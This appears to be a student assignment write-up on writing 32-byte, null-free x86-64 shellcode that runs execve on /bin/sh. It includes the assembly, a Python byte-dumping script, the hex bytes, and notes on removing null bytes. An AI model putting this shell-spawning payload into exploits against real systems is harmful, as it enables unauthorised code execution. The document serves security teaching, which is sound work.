# Shellcode Creation (Golf)

## Assembly Code:

```
.global _start
_start:
    xor %rsi, %rsi
    xor %rdx, %rdx
    mov $0x1168732F6E69622F, %rbx
    shl $0x08, %rbx
    shr $0x08, %rbx
    push %rbx
    mov %rsp, %rdi
    mov $0x3B, %al
    syscall

```

### Steps:

- Set args and env (represented by register `rsi` and `rdx`) to null.
- Insert the hex representation of pathname `\bin\sh` into `rbx`.
- Use `shl` and `shr` to get rid of last 8 bites (why? explanation given later in 'Removing NULLs' section).
- Push `rbx` to stack.
- Move stack pointer to `rdi` to pass the arguments (such as, pathname as `\bin\sh`) to function.
- Move `0x3b` to `al` register which represents execve(2).
- Finally, execute `syscall`.

## ASCII Represntation of Bytes:

### Code

```
infile_path = "/home/csnmsu/Downloads/ShellCode Assignment/shellcode"
output = ""
size = 0

with open(infile_path, "rb") as f:
	while (byte := f.read(1)):
    	byte = byte.hex()
    	output += str(byte) + " "
    	size+=1

print("Shellcode is " + str(size) + " bytes long.")
print("They are: " + output)

```

### Output

```
Shellcode is 32 bytes long.
They are: 48 31 f6 48 31 d2 48 bb 2f 62 69 6e 2f 73 68 11 48 c1 e3 08 48 c1 eb 08 53 48 89 e7 b0 3b 0f 05
```

## Removing NULLs

- Use `al` register for storing 0x3b to avoid extra null bytes caused by a bigger register.
- While inserting null terminator for `\bin\sh`, put any other value (except null or 00) and then do shift-left and shift-right by `0x08`. This operation gives us our desired null terminator without injecting null value to the shellcode. [1]
- `xor` sometimes may cause null values, but this time looks like we are safe. Alternatively, we can use `sub %rsi, %rsi` to set `rsi` to null.  

[1] https://null-byte.wonderhowto.com/how-to/writing-64-bit-shellcode-part-2-removing-null-bytes-0161591/


